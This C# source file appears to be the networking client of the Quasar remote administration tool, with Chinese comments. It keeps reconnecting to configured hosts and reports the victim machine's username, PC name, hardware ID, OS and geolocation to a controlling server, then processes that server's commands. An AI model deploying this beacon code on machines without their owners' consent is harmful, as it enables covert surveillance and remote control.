﻿using Quasar.Client.Config;
using Quasar.Client.Helper;
using Quasar.Client.IO;
using Quasar.Client.IpGeoLocation;
using Quasar.Client.User;
using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Utilities;
using System;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Quasar.Client.Networking
{
    public class QuasarClient : Client, IDisposable
    {
        /// <summary>
        /// 用于跟踪客户端是否已被服务器识别。
        /// </summary>
        private bool _identified;

        /// <summary>
        /// 包含可连接主机的主机管理器。
        /// </summary>
        private readonly HostsManager _hosts;

        /// <summary>
        /// 随机数生成器，用于稍微随机化重连延迟。
        /// </summary>
        private readonly SafeRandom _random;

        /// <summary>
        /// 创建一个<see cref="_token"/>并发出取消信号。
        /// </summary>
        private readonly CancellationTokenSource _tokenSource;

        /// <summary>
        /// 用于检查取消的令牌。
        /// </summary>
        private readonly CancellationToken _token;

        /// <summary>
        /// 初始化<see cref="QuasarClient"/>类的新实例。
        /// </summary>
        /// <param name="hostsManager">包含可连接主机的主机管理器。</param>
        /// <param name="serverCertificate">服务器证书。</param>
        public QuasarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
            : base(serverCertificate)
        {
            this._hosts = hostsManager;
            this._random = new SafeRandom();
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            base.ClientFail += OnClientFail;
            this._tokenSource = new CancellationTokenSource();
            this._token = _tokenSource.Token;
        }

        /// <summary>
        /// 连接循环，用于重新连接并保持连接打开。
        /// </summary>
        public void ConnectLoop()
        {
            // TODO: 不要重复使用对象
            while (!_token.IsCancellationRequested)
            {
                if (!Connected)
                {
                    Host host = _hosts.GetNextHost();

                    base.Connect(host.IpAddress, host.Port);
                }

                while (Connected) // hold client open
                {
                    try
                    {
                        _token.WaitHandle.WaitOne(1000);
                    }
                    catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
                    {
                        Disconnect();
                        return;
                    }
                }

                if (_token.IsCancellationRequested)
                {
                    Disconnect();
                    return;
                }

                Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
            }
        }

        private void OnClientRead(Client client, IMessage message, int messageLength)
        {
            if (!_identified)
            {
                if (message.GetType() == typeof(ClientIdentificationResult))
                {
                    var reply = (ClientIdentificationResult) message;
                    _identified = reply.Result;
                }
                return;
            }

            MessageHandler.Process(client, message);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {
            _identified = false; // always reset identification

            if (connected)
            {
                // send client identification once connected

                var geoInfo = GeoInformationFactory.GetGeoInformation();
                var userAccount = new UserAccount();

                client.Send(new ClientIdentification
                {
                    Version = Settings.VERSION,
                    OperatingSystem = PlatformHelper.FullName,
                    AccountType = userAccount.Type.ToString(),
                    Country = geoInfo.Country,
                    CountryCode = geoInfo.CountryCode,
                    ImageIndex = geoInfo.ImageIndex,
                    Id = HardwareDevices.HardwareId,
                    Username = userAccount.UserName,
                    PcName = SystemHelper.GetPcName(),
                    Tag = Settings.TAG,
                    EncryptionKey = Settings.ENCRYPTIONKEY,
                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE)
                });
            }
        }

        /// <summary>
        /// 停止连接循环并断开连接。
        /// </summary>
        public void Exit()
        {
            _tokenSource.Cancel();
            Disconnect();
        }

        /// <summary>
        /// 释放与此活动检测服务关联的所有托管和非托管资源。
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _tokenSource.Cancel();
                _tokenSource.Dispose();
            }
        }
    }
}
